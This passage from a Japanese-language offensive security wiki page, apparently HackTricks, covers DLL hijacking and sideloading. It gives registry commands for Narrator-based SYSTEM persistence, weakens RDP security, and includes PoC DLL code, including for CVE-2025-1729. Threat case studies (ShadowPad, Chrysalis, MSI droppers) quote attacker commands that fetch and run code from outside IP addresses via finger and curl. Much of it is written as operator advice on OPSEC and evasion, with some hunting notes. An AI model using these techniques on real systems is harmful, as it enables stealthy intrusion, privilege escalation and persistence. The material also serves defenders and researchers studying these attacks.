  return TRUE;
}
```

OPSECの隠密性
- 単純な hijack では、音声が出たり UI が表示されたりします。目立たないようにするには、attach 時に Narrator のスレッドを列挙し、メインスレッドを開いて（`OpenThread(THREAD_SUSPEND_RESUME)`）、`SuspendThread` で一時停止します。その後は自身のスレッドで処理を続けます。完全なコードは PoC を参照してください。<sup>[[8]](#references)</sup>

Accessibility configuration による起動と永続化
- ユーザーコンテキスト（HKCU）: `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM（HKLM）: `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記の設定により、Narrator の起動時に仕込んだ DLL が読み込まれます。セキュアデスクトップ（ログオン画面）で CTRL+WIN+ENTER を押して Narrator を起動すると、DLL がセキュアデスクトップ上で SYSTEM として実行されます。

RDP によってトリガーされる SYSTEM 実行（ラテラルムーブメント）
- 従来の RDP セキュリティレイヤーを許可します: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- ホストに RDP 接続し、ログオン画面で CTRL+WIN+ENTER を押して Narrator を起動すると、DLL がセキュアデスクトップ上で SYSTEM として実行されます。
- RDP セッションが閉じると実行は停止します。速やかに inject/migrate してください。

Bring Your Own Accessibility（BYOA）
- 組み込み Accessibility Tool（AT）のレジストリエントリ（例: CursorIndicator）を複製し、任意のバイナリ/DLL を参照するよう編集してインポートした後、`configuration` にその AT 名を設定できます。これにより、Accessibility framework を介して任意のコードを実行できます。

注意事項
- `%windir%\System32` への書き込みと HKLM 値の変更には、管理者権限が必要です。
- すべての payload ロジックを `DLL_PROCESS_ATTACH` に置くことができ、exports は不要です。

## 事例: CVE-2025-1729 - TPQMAssistant.exe を使用した権限昇格

この事例では、Lenovo TrackPoint Quick Menu（`TPQMAssistant.exe`）における **Phantom DLL Hijacking** を紹介します。この脆弱性は **CVE-2025-1729** として追跡されています。<sup>[[2]](#references)[[3]](#references)</sup>

### 脆弱性の詳細

- **コンポーネント**: `C:\ProgramData\Lenovo\TPQM\Assistant\` にある `TPQMAssistant.exe`。
- **スケジュールされたタスク**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` は、ログオン中のユーザーのコンテキストで毎日午前9時30分に実行されます。
- **ディレクトリのアクセス許可**: `CREATOR OWNER` に書き込みが許可されているため、ローカルユーザーが任意のファイルを配置できます。
- **DLL の検索動作**: 最初に作業ディレクトリから `hostfxr.dll` の読み込みを試み、見つからない場合は "NAME NOT FOUND" を記録します。これは、ローカルディレクトリが優先的に検索されることを示しています。

### Exploit の実装

攻撃者は同じディレクトリに悪意のある `hostfxr.dll` の stub を配置し、DLL が見つからない状態を悪用することで、ユーザーのコンテキストでコードを実行できます:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### 攻撃フロー

1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置します。
2. 現在のユーザーのコンテキストで、スケジュールされたタスクが午前9時30分に実行されるのを待ちます。
3. タスクの実行時に管理者がログインしている場合、悪意のある DLL は管理者のセッションで中整合性レベルで実行されます。
4. 標準的な UAC bypass 技法を組み合わせ、中整合性レベルから SYSTEM 権限に昇格します。

## 事例: MSI CustomAction Dropper + 署名済みホスト (wsc_proxy.exe) 経由の DLL Side-Loading

脅威アクターは、信頼された署名済みプロセスで payload を実行するために、MSI ベースの dropper と DLL side-loading を組み合わせることがよくあります。<sup>[[10]](#references)</sup>

チェーンの概要
- ユーザーが MSI をダウンロードします。GUI インストール中に CustomAction (例: LaunchApplication または VBScript アクション) がサイレントに実行され、埋め込みリソースから次のステージを再構築します。
- Dropper は正規の署名済み EXE と悪意のある DLL を同じディレクトリに書き込みます (ペアの例: Avast 署名済みの wsc_proxy.exe + 攻撃者が制御する wsc.dll)。
- 署名済み EXE が起動すると、Windows の DLL 検索順序により、作業ディレクトリ内の wsc.dll が最初に読み込まれ、署名済みプロセスの配下で攻撃者のコードが実行されます (ATT&CK T1574.001)。

MSI の分析 (確認する項目)
- CustomAction テーブル:
  - 実行ファイルまたは VBScript を実行するエントリを探します。疑わしいパターンの例: LaunchApplication が埋め込みファイルをバックグラウンドで実行する。
  - Orca (Microsoft Orca.exe) で、CustomAction、InstallExecuteSequence、Binary テーブルを調べます。
- MSI CAB 内の埋め込み/分割 payload:
  - 管理者用の展開: msiexec /a package.msi /qb TARGETDIR=C:\out
  - または lessmsi を使用: lessmsi x package.msi C:\out
  - VBScript CustomAction によって連結・復号される複数の小さな断片を探します。一般的なフロー:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

wsc_proxy.exe を使った実践的な sideloading
- 次の2つのファイルを同じフォルダーに配置します。
  - wsc_proxy.exe: 正規の署名済みホスト（Avast）。プロセスは、実行ファイルのディレクトリから名前を指定して wsc.dll を読み込もうとします。
  - wsc.dll: 攻撃者の DLL。特定の exports が不要であれば、DllMain だけで十分です。必要な場合は proxy DLL を作成し、DllMain で payload を実行しながら、必要な exports を正規のライブラリに転送します。
- 最小限の DLL payload をビルドします。

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- export 要件を満たすには、proxying framework（例：DLLirant/Spartacus）を使って、payload も実行する forwarding DLL を生成します。

- この手法は、host binary による DLL name resolution に依存します。host が絶対パスや安全な読み込みフラグ（例：LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用している場合、hijack に失敗することがあります。
- KnownDLLs、SxS、forwarded exports は優先順位に影響するため、host binary と export set の選定時に考慮する必要があります。

## 署名済みトライアド + 暗号化 payload（ShadowPad のケーススタディ）

Check Point は、Ink Dragon が**3ファイルのトライアド**を使い、正規ソフトウェアに紛れ込ませながら、コア payload をディスク上で暗号化したままにして ShadowPad を展開する手法について説明しています。<sup>[[12]](#references)</sup>

1. **署名済み host EXE** – AMD、Realtek、NVIDIA などのベンダーが悪用されます（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者は実行ファイルの名前を `conhost.exe` のような Windows binary に見える名前に変更しますが、Authenticode signature は有効なままです。
2. **悪意のある loader DLL** – EXE と同じ場所に、想定される名前（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）で配置されます。この DLL は通常、ScatterBrain framework で難読化された MFC binary で、その役割は暗号化 blob の場所を特定し、復号して、ShadowPad を reflective に map することだけです。
3. **暗号化 payload blob** – 多くの場合、同じディレクトリ内に `<name>.tmp` として保存されます。復号した payload を memory-map した後、loader は TMP file を削除して forensic evidence を消去します。

Tradecraft に関する注意点：

* PE header の元の `OriginalFileName` を維持したまま署名済み EXE の名前を変更すると、ベンダーの signature を保持しつつ Windows binary を装うことができます。そのため、Ink Dragon のように、実際は AMD/NVIDIA の utility である `conhost.exe` 風の binary を配置する手法を再現できます。
* 実行ファイルは信頼された状態のままなので、多くの allowlisting control では、悪意のある DLL をその隣に置くだけで済みます。loader DLL のカスタマイズに注力してください。署名済みの親は通常、変更せずに実行できます。
* ShadowPad の decryptor は、TMP blob が loader の隣にあり、memory mapping 後に file をゼロ化できるよう書き込み可能であることを想定しています。payload が読み込まれるまで、ディレクトリを書き込み可能な状態に保ってください。メモリ上に読み込まれた後は、OPSEC のため TMP file を安全に削除できます。

### LOLBAS stager + staged archive sideloading chain（finger → tar/curl → WMI）

攻撃者は DLL sideloading と LOLBAS を組み合わせ、ディスク上に残す独自の artifact を、信頼された EXE の隣に置く悪意のある DLL だけにします。<sup>[[1]](#references)</sup>

- **Remote command loader（Finger）：** 隠された PowerShell が `cmd.exe /c` を起動し、Finger server から command を取得して `cmd` に pipe します：

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` は TCP/79 のテキストを取得し、`| cmd` はサーバーの応答を実行するため、運用者は server-side で second stage server を切り替えられます。

- **組み込みのダウンロード／展開:** 無害な拡張子のアーカイブをダウンロードして展開し、sideload 対象と DLL をランダムな `%LocalAppData%` フォルダーに配置します:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` は進行状況を非表示にしてリダイレクトに従います。`tar -xf` は Windows 標準搭載の tar を使用します。

- **WMI/CIM による起動:** WMI 経由で EXE を起動します。これにより、同じディレクトリに配置された DLL の読み込み時に、テレメトリには CIM が作成したプロセスとして記録されます。

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - ローカル DLL を優先するバイナリ（例: `intelbq.exe`、`nearby_share.exe`）で機能し、payload（例: Remcos）は信頼された名前で実行される。

- **Hunting:** `/p`、`/m`、`/c` が同時に指定された `forfiles` にアラートを設定する。管理者用スクリプト以外では一般的ではない。


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

最近の Lotus Blossom による侵入では、信頼された更新チェーンを悪用して NSIS でパックされた dropper を配信し、DLL sideload と完全にメモリ内で動作する payload を展開した。<sup>[[13]](#references)</sup>

Tradecraft の流れ
- `update.exe` (NSIS) は `%AppData%\Bluetooth` を作成して **HIDDEN** 属性を設定し、名前を変更した Bitdefender Submission Wizard `BluetoothService.exe`、悪意のある `log.dll`、暗号化された blob `BluetoothService` を配置してから EXE を起動する。
- ホスト EXE は `log.dll` をインポートし、`LogInit`/`LogWrite` を呼び出す。`LogInit` は blob を mmap で読み込む。`LogWrite` はカスタムの LCG ベースのストリーム暗号（定数 **0x19660D** / **0x3C6EF35F**、鍵素材は以前のハッシュから導出）で復号し、バッファを平文の shellcode で上書きし、一時データを解放して shellcode にジャンプする。
- IAT を回避するため、loader は **FNV-1a basis 0x811C9DC5 + prime 0x1000193** でエクスポート名をハッシュし、Murmur 形式の avalanche (**0x85EBCA6B**) を適用して、salt 付きのターゲットハッシュと照合する。

Main shellcode (Chrysalis)
- `gQ2JR&9;` を鍵として、5 回のパスで add/XOR/sub を繰り返し、PE のようなメインモジュールを復号する。その後、`Kernel32.dll` → `GetProcAddress` を動的にロードしてインポート解決を完了する。
- 文字ごとのビット rotate/XOR 変換で実行時に DLL 名の文字列を再構築し、`oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32` をロードする。
- 2 つ目の resolver は **PEB → InMemoryOrderModuleList** をたどり、各エクスポートテーブルを 4 バイト単位で解析して Murmur 形式の混合処理を行う。ハッシュが見つからない場合に限り、`GetProcAddress` にフォールバックする。

埋め込み設定と C2
- 設定はドロップされた `BluetoothService` ファイル内の **offset 0x30808**（サイズ **0x980**）にあり、キー `qwhvb^435h&*7` で RC4 復号すると C2 URL と User-Agent が得られる。
- beacon はドット区切りのホストプロファイルを作成し、タグ `4Q` を先頭に付けてから、キー `vAuig34%^325hGV` で RC4 暗号化し、HTTPS 経由で `HttpSendRequestA` に渡す。応答は RC4 復号され、タグによる switch（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）で処理される。
- 実行モードは CLI 引数で制御される。引数なしの場合は `-i` を指す service/Run key persistence をインストールし、`-i` は `-k` を付けて自身を再起動する。`-k` はインストールを省略して payload を実行する。

観測された別の loader
- 同じ侵入では Tiny C Compiler も配置され、`C:\ProgramData\USOShared\` から `svchost.exe -nostdlib -run conf.c` が実行された。隣には `libtcc.dll` が置かれていた。攻撃者が用意した C ソースには shellcode が埋め込まれており、コンパイル後、PE をディスクに書き込まずにメモリ内で実行された。次のように再現できる。

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- この TCC ベースのコンパイル・実行ステージは、実行時に `Wininet.dll` をインポートし、ハードコードされた URL から第 2 ステージの shellcode を取得することで、コンパイラーの実行を装う柔軟な loader として機能しました。

## export proxying と host thread parking を組み合わせた、署名済み host の sideloading

一部の DLL sideloading チェーンでは、正規の host が後続ステージを正常に読み込めるよう、悪意のある DLL の読み込み後にクラッシュすることなくプロセスを十分な時間存続させる**安定性の確保**が行われます。<sup>[[11]](#references)</sup>

確認されたパターン
- 信頼できる EXE を、`version.dll` など依存関係として想定される名前の悪意のある DLL と同じ場所に配置する。
- 悪意のある DLL は、想定されるすべての export を実際の system DLL（例：`%SystemRoot%\\System32\\version.dll`）に**proxy**し、import 解決が成功して host process が動作し続けるようにする。
- 読み込み後、悪意のある DLL は host の entry point にパッチを適用し、main thread が終了したり process を終了させるコードパスを実行したりせず、無限の `Sleep` loop に入るようにする。
- 新しい thread が実際の悪意ある処理を実行する。次のステージの DLL 名またはパスを復号（RC4/XOR が一般的）し、`LoadLibrary` で起動する。

重要な理由
- 通常の DLL proxying は API 互換性を維持しますが、後続ステージのために host が十分な時間存続することまでは保証しません。
- main thread を `Sleep(INFINITE)` で待機させることで、loader が worker thread 内で復号、staging、または network bootstrap を行う間、署名済み process を常駐させられます。
- 不審な `DllMain` だけを探していると、host entry point へのパッチ適用後に興味深い挙動が起き、secondary thread が開始するこのパターンを見逃す可能性があります。

最小限の workflow
1. 署名済み host EXE をコピーし、ローカルディレクトリから読み込まれる DLL を特定する。
2. 同じ関数を export し、正規の DLL に転送する proxy DLL を作成する。
3. `DllMain(DLL_PROCESS_ATTACH)` で worker thread を作成する。
4. その thread から host entry point または main thread の開始ルーチンにパッチを適用し、`Sleep` loop に入るようにする。
5. 次のステージの DLL 名/config を復号し、`LoadLibrary` を呼び出すか、payload を manual-map する。

防御側の調査ポイント
- 署名済み process が `version.dll` などの一般的なライブラリを、`System32` ではなく自身の application directory から読み込んでいる。
- image load 直後に process entry point へメモリパッチが適用されている。特に、ジャンプ/呼び出しが `Sleep`/`SleepEx` にリダイレクトされている場合。
- proxy DLL が作成した thread が、復号された名前の 2 つ目の DLL に対して直ちに `LoadLibrary` を呼び出している。
- `ProgramData`、`%TEMP%`、展開済み archive のパスなど、書き込み可能な staging directory 内で vendor executable と同じ場所に配置された、全 export を備える proxy DLL。

## References

- [1] [Red Canary – Intelligence Insights: 2026年1月](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe を利用した権限昇格](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows の DLL hijacking。シンプルな C の例。](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore がヨーロッパを標的とする新たな malware を展開](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL hijack と Windows ヘルパーの遭遇](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – デジタル上の Doppelganger: Gh0st RAT を配布する、進化するなりすましキャンペーンの分析](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – 利害の収束: 東南アジアの政府を標的とする脅威クラスターの分析](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon の内部: 中継ネットワークと隠密な攻撃作戦の内部動作を解明](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom の toolkit を詳しく分析](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – イランの APT Screening Serpens による2026年の諜報キャンペーンを追跡](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: イラン紛争中の Nimbus Manticore の作戦](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 が東南アジアの政府機関と重要インフラを標的に](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
